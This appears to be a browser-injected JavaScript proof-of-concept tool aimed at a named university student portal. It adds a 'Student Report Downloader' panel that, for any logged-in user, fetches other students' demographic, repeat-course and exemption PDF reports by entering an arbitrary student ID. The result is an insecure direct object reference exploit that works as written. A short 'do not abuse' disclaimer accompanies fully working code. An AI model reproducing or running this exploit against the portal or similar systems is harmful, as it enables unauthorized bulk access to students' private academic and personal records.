function renderUi() {
  // Check if the UI already exists to prevent duplication
  if (document.getElementById("poc-container")) return;

  // Create container
  const container = document.createElement("div");
  container.id = "poc-container";
  container.className = "poc-container";

  // Create the inner HTML
  container.innerHTML = `
    <div class="poc-box">
      <h1 class="poc-title">
        iCampus Student Report Downloader
      </h1>
      <input type="text" id="poc-student-id" class="poc-input" placeholder="Enter Student ID" />
      <button id="poc-download-btn" class="poc-button">Download Reports</button>
      <div class="poc-disclaimer">
        <p><strong>Proof of Concept. Do not abuse.</strong></p>
        <p>This tool illustrates how vulnerable iCampus is to data theft.</p>
      </div>
    </div>
  `;

  document.body.appendChild(container);

  // Attach event listener
  const downloadBtn = document.getElementById("poc-download-btn");
  downloadBtn.addEventListener("click", () => {
    const studentId = document.getElementById("poc-student-id").value.trim();
    scrape(studentId);
  });
}

function createToggleButton() {
  if (document.getElementById("poc-toggle-btn")) return; // Prevent duplicates

  const toggleButton = document.createElement("button");
  toggleButton.id = "poc-toggle-btn";
  toggleButton.className = "poc-toggle-btn";
  toggleButton.innerText = "Toggle Downloader";

  toggleButton.addEventListener("click", toggleUi);

  document.body.appendChild(toggleButton);
}

function toggleUi() {
  let container = document.getElementById("poc-container");

  // If it doesn't exist, render it
  if (!container) {
    renderUi();
    container = document.getElementById("poc-container");
  }

  // Toggle visibility
  const isHidden = container.style.display === "none";
  container.style.display = isHidden ? "block" : "none";
}

// Supporting functions (you already had these)
const repTypes = {
  StudentDemo: "StudentDemo",
  RepeatCourse: "RepeatCourse",
  Exempt: "Exempt",
};

function getUrl(studentId, repType) {
  return `https://icampus.ueab.ac.ke/iReports/Default?RepType=${repType}&StdID=${studentId}`;
}

async function downloadFiles(files) {
  if (!Array.isArray(files) || files.length === 0) {
    console.error("Please provide an array of files.");
    return;
  }

  const downloads = files.map(async ({ url, filename }) => {
    try {
      const response = await fetch(url);

      if (!response.ok) {
        throw new Error(`Failed to fetch ${url}: ${response.statusText}`);
      }

      const blob = await response.blob();
      const blobUrl = window.URL.createObjectURL(blob);

      const link = document.createElement("a");
      link.href = blobUrl;
      link.download = filename || "download";
      document.body.appendChild(link);
      link.click();
      document.body.removeChild(link);

      // Release the object URL to free up memory
      window.URL.revokeObjectURL(blobUrl);

      console.log(`Downloaded: ${filename}`);
    } catch (error) {
      console.error(`Error downloading ${url}:`, error);
    }
  });

  // Wait for all downloads to complete
  await Promise.all(downloads);
}

async function scrape(studentId) {
  if (!studentId) {
    alert("Please enter a Student ID.");
    return;
  }

  document.getElementById("poc-download-btn").disabled = true;

  document.getElementById("poc-download-btn").innerText = "Validating...";

  try {
    if (!(await checkIsLoggedIn())) {
      alert(
        "This tool can download reports for *any* student, not just the one you're logged in as. You still need to be logged in first. Please log in and try again."
      );
      return;
    }

    document.getElementById("poc-download-btn").innerText = "Downloading...";

    const urls = Object.values(repTypes).map((repType) => ({
      url: getUrl(studentId, repType),
      filename: `${studentId}_${repType}.pdf`,
    }));
    await downloadFiles(urls);
  } catch (error) {
    console.error(error);
    alert("Error occured");
  } finally {
    document.getElementById("poc-download-btn").disabled = false;
    document.getElementById("poc-download-btn").innerText = "Download Reports";
  }
}

async function checkIsLoggedIn() {
  if (getLogoutAnchor()) return true;

  const res = await fetch(`https://icampus.ueab.ac.ke/iStudent/Auth/Classes/`);
  const text = await res.text();

  const hasLogoutButton = text.includes(`Logout`);

  return hasLogoutButton;
}

function getLogoutAnchor() {
  // <a id="ucHeader_hyLog" href="../../iUsers/Log.aspx">
  // 				<span class="logout">
  // 					Logout
  // 				</span>
  // 			</a>

  return document.getElementById("ucHeader_hyLog");
}

// function getCogs(stdId) {
//   const cogsUrl = "https://icampus.ueab.ac.ke/iStudent/Auth/Reports/COGs";
//   const ourQueryParam = "__cogs__fetch";

//   const cogTableSelector = "#pTable";

//   if (!window.location.href.includes(cogsUrl))
//     return (window.location.href = cogsUrl);

//   const cogsBeenLoaded =
//     document.querySelector(cogTableSelector) &&
//     document.querySelector("#mainContent_uiRequests_txtStudentID").value ===
//       stdId;

//   if (!cogsBeenLoaded) return loadCogs();

//   // downloadCogs();
// }

// function loadCogs(stdId) {
//   document.querySelector("#mainContent_uiRequests_txtStudentID").value = stdId;

//   document.querySelector("#mainContent_uiRequests_btnLoad").click();
// }

// Initialize UI
// renderUi();
createToggleButton();
